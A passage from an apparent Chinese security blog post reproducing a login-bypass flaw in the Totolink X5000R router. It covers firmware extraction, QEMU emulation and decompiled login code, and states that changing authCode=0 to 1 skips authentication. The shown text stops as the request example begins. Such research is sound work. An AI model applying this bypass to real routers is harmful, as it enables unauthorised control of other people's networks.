@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Closure" />
+  <meta name="description" content="" />
+  <meta name="google-site-verification" content="ume8wxFIzFnN-uS2NK6TLbEnB0OL8U3QYLpG-0v0NPM" />
+  
+  
+  <title>
+    
+      Totolink X5000R 未授权访问漏洞复现 
+      
+      
+      |
+    
+     Closure
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Closure</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Totolink X5000R 未授权访问漏洞复现</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2024-08-19 15:39:00
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/IOT%E5%AE%89%E5%85%A8/" title="IOT安全">
+                    #IOT安全
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/" title="路由器安全">
+                    #路由器安全
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="TOTOLINK-X5000R"><a href="#TOTOLINK-X5000R" class="headerlink" title="TOTOLINK X5000R"></a>TOTOLINK X5000R</h1><p>《水》</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>固件下载：</p>
+<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;totolink.cn&#x2F;home&#x2F;menu&#x2F;detail.html?menu_listtpl&#x3D;download&amp;id&#x3D;65&amp;ids&#x3D;36</code></pre>
+
+<p>获取一个新版本固件，一个旧版本（用于对比）</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311181623427.png"></p>
+<p>固件提取：固件均未加密，直接binwalk提取即可</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">binwalk <span class="token parameter variable">-Me</span> TOTOLINK_X5000R_V9.1.0u.6118.web
+binwalk <span class="token parameter variable">-Me</span> TOTOLINK_X5000R_V9.1.0u.6369.web</code></pre>
+
+<p>获得文件系统：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311192135483.png" alt="image-20231119213530429"></p>
+<p>大概看一下文件系统里面有什么，使用firmwalker简单分析一下，例如找到conf相关文件：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311201520061.png" alt="image-20231120152056027"></p>
+<p>通过busybox看一下这个文件系统的架构：mips32，小端序</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311201526513.png"></p>
+<p>历史漏洞：</p>
+<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvekey.cgi?keyword&#x3D;X5000R</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311201504877.png" alt="image-20231120145534829"></p>
+<h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><p>获取虚拟镜像和磁盘：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2
+<span class="token function">wget</span> https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta</code></pre>
+
+<p>通过脚本启动QEMU</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#set network</span>
+<span class="token function">sudo</span> brctl addbr virbr0
+<span class="token function">sudo</span> <span class="token function">ifconfig</span> virbr0 <span class="token number">192.168</span>.5.1/24 up
+<span class="token function">sudo</span> tunctl <span class="token parameter variable">-t</span> tap0
+<span class="token function">sudo</span> <span class="token function">ifconfig</span> tap0 <span class="token number">192.168</span>.5.11/24 up
+<span class="token function">sudo</span> brctl addif virbr0 tap0
+
+<span class="token function">sudo</span> qemu-system-mipsel <span class="token parameter variable">-M</span> malta <span class="token parameter variable">-kernel</span> vmlinux-3.2.0-4-4kc-malta <span class="token parameter variable">-hda</span> debian_wheezy_mipsel_standard.qcow2 <span class="token parameter variable">-append</span> <span class="token string">"root=/dev/sda1"</span> <span class="token parameter variable">-netdev</span> tap,id<span class="token operator">=</span>tapnet,ifname<span class="token operator">=</span>tap0,script<span class="token operator">=</span>no <span class="token parameter variable">-device</span> rtl8139,netdev<span class="token operator">=</span>tapnet <span class="token parameter variable">-nographic</span></code></pre>
+
+<p>登陆默认密码为root&#x2F;root</p>
+<p>在QEMU中配置网络：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ifconfig</span> eth0 <span class="token number">192.168</span>.5.12 up</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311201735676.png" alt="image-20231120173559641"></p>
+<p>将路由器文件系统（旧版本固件）传入QEMU中：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> <span class="token parameter variable">-r</span> squashfs-root/ root@192.168.5.12:/root/</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311201738742.png" alt="image-20231120173821708"></p>
+<p>挂载启动文件系统：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chroot</span> ./squashfs-root/ /bin/sh</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311201739490.png" alt="image-20231120173930446"></p>
+<p>使用lighttpd.conf启动Web服务：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">lighttpd <span class="token parameter variable">-f</span> lighttp/lighttpd.conf <span class="token parameter variable">-m</span> lighttp/lib/</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311201741954.png" alt="image-20231120174127935"></p>
+<p>提示没有&#x2F;var&#x2F;run&#x2F;lighttpd.pid，那就手动创建一下并再启动一次：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /var/run <span class="token operator">&amp;&amp;</span> <span class="token function">touch</span> /var/run/lighttpd.pid</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311201745006.png"></p>
+<p>成功启动，访问一下试试：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311201746712.png"></p>
+<h2 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h2><p>先尝试抓个登陆包看看是那个程序用于处理web数据：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311212118786.png" alt="image-20231121211803749"></p>
+<p>先看第一个包：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311212129738.png" alt="image-20231121212944715"></p>
+<p>可以看到调用了cstecgi.cgi这个文件，分析一下这个程序：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311202150250.png"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311202151542.png" alt="image-20231120215133501"></p>
+<p>丢IDA里看看，根据响应包找一下action&#x3D;login字符串：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311202206913.png" alt="image-20231120220659884"></p>
+<p>查看交叉引用，F5一下：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311212244997.png"></p>
+<p>大概捋一下这个函数是干啥的：</p>
+<pre class="language-c" data-language="c"><code class="language-c">loginAuthUrl <span class="token operator">=</span> <span class="token function">websGetVar</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token string">"loginAuthUrl"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>byte_437F70<span class="token punctuation">)</span><span class="token punctuation">;</span>
+Object <span class="token operator">=</span> <span class="token function">cJSON_CreateObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+v32 <span class="token operator">=</span> v24<span class="token punctuation">;</span>
+<span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  v5 <span class="token operator">=</span> v3 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">getNthValueSafe</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> loginAuthUrl<span class="token punctuation">,</span> <span class="token string">"&amp;"</span><span class="token punctuation">,</span> v22<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
+    <span class="token keyword">break</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">getNthValueSafe</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v22<span class="token punctuation">,</span> <span class="token string">"="</span><span class="token punctuation">,</span> v23<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token function">getNthValueSafe</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> v22<span class="token punctuation">,</span> <span class="token string">"="</span><span class="token punctuation">,</span> v32<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    String <span class="token operator">=</span> <span class="token function">cJSON_CreateString</span><span class="token punctuation">(</span>v32<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">cJSON_AddItemToObject</span><span class="token punctuation">(</span>Object<span class="token punctuation">,</span> v23<span class="token punctuation">,</span> String<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  v3 <span class="token operator">=</span> v5<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+username <span class="token operator">=</span> <span class="token function">websGetVar</span><span class="token punctuation">(</span>Object<span class="token punctuation">,</span> <span class="token string">"username"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>byte_437F70<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取username</span>
+password <span class="token operator">=</span> <span class="token function">websGetVar</span><span class="token punctuation">(</span>Object<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>byte_437F70<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取password</span>
+http_host <span class="token operator">=</span> <span class="token function">websGetVar</span><span class="token punctuation">(</span>Object<span class="token punctuation">,</span> <span class="token string">"http_host"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>byte_437F70<span class="token punctuation">)</span><span class="token punctuation">;</span>
+flag <span class="token operator">=</span> <span class="token function">websGetVar</span><span class="token punctuation">(</span>Object<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>word_436104<span class="token punctuation">)</span><span class="token punctuation">;</span>
+wizard_flag <span class="token operator">=</span> <span class="token function">nvram_get_int</span><span class="token punctuation">(</span><span class="token string">"wizard_flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span> wizard_flag <span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v11 <span class="token operator">=</span> <span class="token function">nvram_safe_get</span><span class="token punctuation">(</span><span class="token string">"opmode_custom"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>v11<span class="token punctuation">,</span> <span class="token string">"gw"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>v11<span class="token punctuation">,</span> <span class="token string">"wisp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isWanConnected</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>v11<span class="token punctuation">,</span> <span class="token string">"rpt"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get_apcli_connected</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span>
+    <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>v11<span class="token punctuation">,</span> <span class="token string">"br"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">nvram_get_int</span><span class="token punctuation">(</span><span class="token string">"dl_status_lan"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    wizard_flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token function">urldecode</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> decode_password<span class="token punctuation">)</span><span class="token punctuation">;</span>
+http_username <span class="token operator">=</span> <span class="token function">nvram_safe_get</span><span class="token punctuation">(</span><span class="token string">"http_username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">strcpy</span><span class="token punctuation">(</span>cp_http_username<span class="token punctuation">,</span> http_username<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 获取http_username</span>
+http_passwd <span class="token operator">=</span> <span class="token function">nvram_safe_get</span><span class="token punctuation">(</span><span class="token string">"http_passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">strcpy</span><span class="token punctuation">(</span>cp_http_passwd<span class="token punctuation">,</span> http_passwd<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 获取http_passwd</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>http_host <span class="token punctuation">)</span>
+  <span class="token function">strcpy</span><span class="token punctuation">(</span>cp_http_host<span class="token punctuation">,</span> http_host<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">else</span>
+  <span class="token function">strcpy</span><span class="token punctuation">(</span>cp_http_host<span class="token punctuation">,</span> v30<span class="token punctuation">)</span><span class="token punctuation">;</span>
+check_username <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> cp_http_username<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 检查username</span>
+v15 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>decode_password<span class="token punctuation">,</span> cp_http_passwd<span class="token punctuation">)</span> <span class="token operator">||</span> check_username <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">// 检查password</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span> flag <span class="token punctuation">)</span>
+  <span class="token function">strcpy</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> cp_http_username<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> cp_http_username<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>decode_password<span class="token punctuation">,</span> cp_http_passwd<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 检查通过</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token string">"ie8"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>                 <span class="token comment">// 判断浏览器类型</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">strcpy</span><span class="token punctuation">(</span>v20<span class="token punctuation">,</span> <span class="token string">"wan_ie.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">atoi</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> wizard_flag <span class="token punctuation">)</span>
+      <span class="token function">strcpy</span><span class="token punctuation">(</span>v20<span class="token punctuation">,</span> <span class="token string">"phone/wizard.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">else</span>
+      <span class="token function">strcpy</span><span class="token punctuation">(</span>v20<span class="token punctuation">,</span> <span class="token string">"phone/home.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> wizard_flag <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">strcpy</span><span class="token punctuation">(</span>v20<span class="token punctuation">,</span> <span class="token string">"wizard.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">strcpy</span><span class="token punctuation">(</span>v20<span class="token punctuation">,</span> <span class="token string">"home.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token function">nvram_set_int_temp</span><span class="token punctuation">(</span><span class="token string">"cloudupg_checktype"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">doSystem</span><span class="token punctuation">(</span><span class="token string">"lktos_reload %s"</span><span class="token punctuation">,</span> <span class="token string">"cloudupdate_check 2>/dev/null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span>                                          <span class="token comment">// 检查不通过</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token string">"ie8"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">strcpy</span><span class="token punctuation">(</span>v20<span class="token punctuation">,</span> <span class="token string">"login_ie.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">atoi</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">strcpy</span><span class="token punctuation">(</span>v20<span class="token punctuation">,</span> <span class="token string">"phone/login.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">strcpy</span><span class="token punctuation">(</span>v20<span class="token punctuation">,</span> <span class="token string">"login.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> v15 <span class="token punctuation">)</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_4373F8<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token function">snprintf</span><span class="token punctuation">(</span>httpStatus302<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token string">"&#123;\"httpStatus\":\"%s\",\"host\":\"%s\""</span><span class="token punctuation">,</span> <span class="token string">"302"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+httpStatus302_len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>httpStatus302<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">atoi</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">snprintf</span><span class="token punctuation">(</span>
+    <span class="token operator">&amp;</span>httpStatus302<span class="token punctuation">[</span>httpStatus302_len<span class="token punctuation">]</span><span class="token punctuation">,</span>
+    <span class="token number">0x1000</span> <span class="token operator">-</span> httpStatus302_len<span class="token punctuation">,</span>
+    <span class="token string">",\"redirectURL\":\"http://%s/formLoginAuth.htm?authCode=%d&amp;userName=%s&amp;goURL=%s&amp;action=login&amp;flag=1\"&#125;"</span><span class="token punctuation">,</span>
+    cp_http_host<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token string">"ie8"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">snprintf</span><span class="token punctuation">(</span>
+    <span class="token operator">&amp;</span>httpStatus302<span class="token punctuation">[</span>httpStatus302_len<span class="token punctuation">]</span><span class="token punctuation">,</span>
+    <span class="token number">0x1000</span> <span class="token operator">-</span> httpStatus302_len<span class="token punctuation">,</span>
+    <span class="token string">",\"redirectURL\":\"http://%s/formLoginAuth.htm?authCode=%d&amp;userName=%s&amp;goURL=%s&amp;action=login&amp;flag=ie8\"&#125;"</span><span class="token punctuation">,</span>
+    cp_http_host<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">snprintf</span><span class="token punctuation">(</span>
+    <span class="token operator">&amp;</span>httpStatus302<span class="token punctuation">[</span>httpStatus302_len<span class="token punctuation">]</span><span class="token punctuation">,</span>
+    <span class="token number">0x1000</span> <span class="token operator">-</span> httpStatus302_len<span class="token punctuation">,</span>
+    <span class="token string">",\"redirectURL\":\"http://%s/formLoginAuth.htm?authCode=%d&amp;userName=%s&amp;goURL=%s&amp;action=login\"&#125;"</span><span class="token punctuation">,</span>
+    cp_http_host<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+v17 <span class="token operator">=</span> <span class="token function">cJSON_Parse</span><span class="token punctuation">(</span>httpStatus302<span class="token punctuation">)</span><span class="token punctuation">;</span>
+redirectURL <span class="token operator">=</span> <span class="token function">websGetVar</span><span class="token punctuation">(</span>v17<span class="token punctuation">,</span> <span class="token string">"redirectURL"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>byte_437F70<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"HTTP/1.1 302 Redirect to page"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Content-type: text/plain"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Connection: Keep-Alive\nPragma: no-cache\nCache-Control: no-cache"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Location: %s\n\n"</span><span class="token punctuation">,</span> redirectURL<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Location</span>
+<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"protal page"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>主要功能就是检查username和password；</p>
+<p>由cstecgi.cgi得到<a target="_blank" rel="noopener" href="http://192.168.5.12/formLoginAuth.htm?authCode=0&userName=&goURL=login.html&action=login%EF%BC%8C%E8%80%8C%E7%94%B1%E4%BA%8EformLoginAuth.htm%E4%B8%BAhtm%E6%96%87%E4%BB%B6%EF%BC%8C%E9%9C%80%E8%A6%81%E7%94%B1lighttpd%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86==%E3%80%8B">http://192.168.5.12/formLoginAuth.htm?authCode=0&amp;userName=&amp;goURL=login.html&amp;action=login，而由于formLoginAuth.htm为htm文件，需要由lighttpd进行处理==》</a></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311212208091.png" alt="image-20231121220848025"></p>
+<p>分析一下lighttpd：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311212349797.png"></p>
+<p>根据formLoginAuth.htm定位：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311212351282.png" alt="image-20231121235127257"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311212352114.png" alt="image-20231121235257071"></p>
+<p>可以看到我们的请求经过strstr()函数后将进入Form_Login函数：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311221700844.png" alt="image-20231122170001804"></p>
+<p>函数获取了authCode&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311221724969.png" alt="image-20231122172420916"></p>
+<p>当<strong>authCode&#x3D;1</strong>进入if的代码块中将获取SESSION_ID，若符合条件：获取SESSION_ID cookie的值存储于V15，并通过这个值检查这个会话是否有效&#x3D;&#x3D;》当然这个是成立的，也不需要绕过啥的&#x3D;&#x3D;》将返回home.html，也就是说可以<strong>绕过登陆验证</strong>&#x3D;&#x3D;》</p>
+<p>home.html将重定向至&#x2F;basic&#x2F;index.html：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202311221808276.png" alt="image-20231122180833248"></p>
+<h2 id="漏洞验证（旧未授权登陆）"><a href="#漏洞验证（旧未授权登陆）" class="headerlink" title="漏洞验证（旧未授权登陆）"></a>漏洞验证（旧未授权登陆）</h2><p>只需要修改一下原包：authCode&#x3D;0改为1即可</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#原包：</span>
